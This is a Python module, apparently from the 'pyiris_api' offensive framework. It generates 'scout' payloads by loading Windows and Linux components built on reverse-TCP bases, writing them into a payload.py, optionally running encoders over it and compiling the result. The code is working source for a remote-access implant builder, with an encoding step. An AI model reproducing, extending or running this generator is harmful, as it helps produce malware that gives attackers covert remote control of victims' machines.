# API
# done
import pyiris_api.library.modules.dynamic_help_generator as dynamic_help_generator
import pyiris_api.library.modules.compiler as compiler
import pyiris_api.library.modules.clean_import_data as clean_import_data
import os


def check_imports(self):
    global tmp_win
    tmp_win = list(self.config.win_components.values())
    tmp_win.append('windows/bases/reverse_tcp_base')
    for i in tmp_win:
        exec("global " + i.replace('/', '_'), globals())
        exec(f"{i.replace('/', '_')} = __import__('pyiris_api.components', globals(), locals(), ['{i.replace('/', '.')}']).{i.replace('/', '.')}", globals())
    self.log.pos('Loaded all windows components into generator - OK')
    global tmp_lin
    tmp_lin = list(self.config.lin_components.values())
    tmp_lin.append('linux/bases/reverse_tcp_base')
    for i in tmp_lin:
        exec("global " + i.replace('/', '_'), globals())
        exec(f"{i.replace('/', '_')} = __import__('pyiris_api.components', globals(), locals(), ['{i.replace('/', '.')}']).{i.replace('/', '.')}", globals())
    self.log.pos('Loaded all linux components into generator - OK')
    global tmp_enc
    tmp_enc = list(self.config.encoders.values())
    for i in tmp_enc:
        exec("global " + i.replace('/', '_'), globals())
        exec(f"{i.replace('/', '_')} = __import__('pyiris_api.encoders', globals(), locals(), ['{i.replace('/', '.')}']).{i.replace('/', '.')}", globals())
    self.log.pos('Loaded all encoders into generator - OK')


def main(self, generator_settings=None):
    if generator_settings is None:
        generator_settings = {}
    try:
        original = os.getcwd()
        os.chdir(self.config.started_at)
        comp_list = sorted([i for i in self.config.loaded_components.values() if not i.endswith('_base')]) # this looks for *_base which is our base network components, appends them to the top  of the list
        for i in self.config.loaded_components.values():
            if i.endswith('_base'): # this looks for *_base which is our base network components, appends them to the top  of the list
                comp_list.insert(0, i)
        for i in comp_list:
            self.log.pos('Loading and executing : ' + i)
            try:
                exec(i.replace('/', '_') + '.main(self, "generate", ' + str(generator_settings) + ')')  # if the function requires extra parameters
            except TypeError:
                exec(i.replace('/', '_') + '.main(self, "generate")')  # if the function does not require extra parameters
        self.log.inf('Reading contents from temporary written file...')
        with open(os.path.join(self.config.local_time_dir, 'payload.py'), 'r') as f:
            save_data = f.read()
        self.config.functions = list(set(self.config.functions))
        self.config.import_statements = list(set(self.config.import_statements))
        self.config.global_objs = list(set(self.config.global_objs))
        self.config.logics = list(set(self.config.logics))
        # change dir into the "root/datetime" folder for payload generation
        os.chdir(self.config.local_time_dir)
        with open('payload.py', 'w') as f:
            self.log.inf('Writing in imports...')
            f.write(clean_import_data.main(self.config.import_statements) + '\n\n')
            self.log.inf('Writing in help menu...')
            f.write('help_menu = ' + "'''" + dynamic_help_generator.main(self) + "'''" + '\n')
            self.log.inf('Writing in global variables...')
            for i in self.config.global_objs:
                f.write(i + '\n')
            self.log.inf('Writing in components...')
            for i in self.config.functions:
                f.write(i + '\n')
            self.log.inf('Writing in startup components...')
            for i in self.config.startup_start:
                f.write(i + '\n')
            for i in self.config.startup:
                f.write(i + '\n')
            for i in self.config.startup_end:
                f.write(i + '\n')
            self.log.inf('Writing in component list for frontend...')
            f.write("comp_list = " + str(comp_list) + "\n")
            self.log.inf('Writing in base component...')
            for i in self.config.logics:
                save_data = save_data.replace('#Statements#', '#Statements#' + i)
            save_data = save_data.replace('#Statements#', '')
            f.write(save_data)
        if self.config.loaded_encoders:
            for i in self.config.loaded_encoders:
                self.log.pos('Encoding with encoder : ' + i)
                exec(i + '.main(self, "encode")')
        self.log.pos('Successfully generated scout python file to : ' + os.path.join(os.getcwd(), 'payload.py'))
        if self.config.scout_values['Compile'][0] == 'True':
            self.log.inf('Compiling scout...')
            if "compiler_settings" in generator_settings.keys():
                output = compiler.main(self, generator_settings["compiler_settings"])
            else:
                output = compiler.main(self, {})
        else:
            output = {"status": "ok", "message": "Generation Successful", "data": None}
        self.config.functions = []
        self.config.import_statements = []
        self.config.global_objs = []
        self.config.logics = []
        self.config.startup = []
        self.config.startup_end = []
        self.config.startup_start = []
        self.config.help_menu = {}
        # Bring us back to the original dir the user was in to not disrupt local operations
        os.chdir(original)
        return output
    except IOError as e:
        raise e
        #self.log.err('File error (Is another process using a file of the same filepath?)')
        #return {"status": "error", "message": "File error (Is another process using a file of the same filepath?)", "data": None}
